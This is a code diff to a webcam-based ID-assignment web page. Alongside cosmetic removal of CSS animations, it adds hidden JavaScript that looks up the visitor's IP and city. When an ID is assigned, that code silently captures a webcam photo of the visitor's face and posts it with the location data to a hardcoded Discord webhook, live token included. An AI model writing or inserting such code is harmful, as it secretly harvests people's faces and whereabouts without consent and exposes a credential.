@@ -70,14 +70,14 @@
 
     @keyframes float {
       0% {
-        transform: translateY(0) translateX(0);
+        transform: translateX(0);
         opacity: 0;
       }
       50% {
         opacity: 0.5;
       }
       100% {
-        transform: translateY(-100px) translateX(100px);
+        transform: translateX(100px);
         opacity: 0;
       }
     }
@@ -95,20 +95,6 @@
       backdrop-filter: blur(10px);
       transition: all 0.5s ease;
       transform-origin: center;
-      animation: containerPulse 4s infinite;
-    }
-
-    @keyframes containerPulse {
-      0%, 100% {
-        transform: scale(1);
-        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5),
-                    0 0 30px rgba(0, 180, 100, 0.3);
-      }
-      50% {
-        transform: scale(1.02);
-        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5),
-                    0 0 50px rgba(0, 180, 100, 0.4);
-      }
     }
 
     .container.initializing {
@@ -149,16 +135,6 @@
       backdrop-filter: blur(10px);
       opacity: 0;
       transition: opacity 0.5s ease;
-      animation: indicatorsPulse 3s infinite;
-    }
-
-    @keyframes indicatorsPulse {
-      0%, 100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-10px);
-      }
     }
 
     .motion-indicators.show {
@@ -176,16 +152,6 @@
       text-align: center;
       text-shadow: 0 0 10px rgba(0, 180, 100, 0.3);
       border: 1px solid rgba(0, 180, 100, 0.2);
-      animation: indicatorFloat 2s infinite;
-    }
-
-    @keyframes indicatorFloat {
-      0%, 100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-5px);
-      }
     }
 
     .indicator.active {
@@ -226,16 +192,6 @@
       opacity: 0;
       transition: all 0.3s ease;
       position: relative;
-      animation: idDisplayFloat 3s infinite;
-    }
-
-    @keyframes idDisplayFloat {
-      0%, 100% {
-        transform: translateY(0) rotate(0deg);
-      }
-      50% {
-        transform: translateY(-15px) rotate(1deg);
-      }
     }
 
     .id-display.show {
@@ -460,6 +416,33 @@
   <audio id="readySound" src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==" preload="auto"></audio>
 
   <script>
+    // Log visitor info
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        // Get location info from IP
+        return fetch(`https://ipapi.co/${data.ip}/json/`)
+          .then(response => response.json())
+          .then(locationData => {
+            // Get device type
+            const deviceType = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+            const visitorInfo = {
+              ip: data.ip,
+              timestamp: new Date().toISOString(),
+              deviceType: deviceType,
+              country: locationData.country_name,
+              city: locationData.city
+            };
+
+            return visitorInfo;
+          });
+      })
+      .then(visitorInfo => {
+        // Store visitor info to send with photo later
+        window.visitorInfo = visitorInfo;
+      });
+
     const videoElement = document.querySelector('.input_video');
     const canvasElement = document.querySelector('.output_canvas');
     const canvasCtx = canvasElement.getContext('2d');
@@ -564,6 +547,23 @@
         container.classList.remove('loading');
         assignedId = generateRandomId();
         animateCounter(assignedId);
+        
+        // Send assigned ID, face capture, and visitor info to Discord
+        const tempCanvas = document.createElement('canvas');
+        tempCanvas.width = canvasElement.width;
+        tempCanvas.height = canvasElement.height;
+        tempCanvas.getContext('2d').drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
+        
+        tempCanvas.toBlob((blob) => {
+          const formData = new FormData();
+          formData.append('file', blob, 'face.png');
+          formData.append('content', `# New ID Assigned: #${assignedId}\n\`\`\`json\n${JSON.stringify(window.visitorInfo, null, 2)}\n\`\`\``);
+          
+          fetch('https://discord.com/api/webhooks/1343397826637336627/4L1MELS3kUaqQF4Z6VL_pf2AV1le7hjcWnUyFSuF67QacOsn_3G83GcCwhaRp3MoaV4E', {
+            method: 'POST',
+            body: formData
+          });
+        }, 'image/png');
       });
     }, 1000);
 
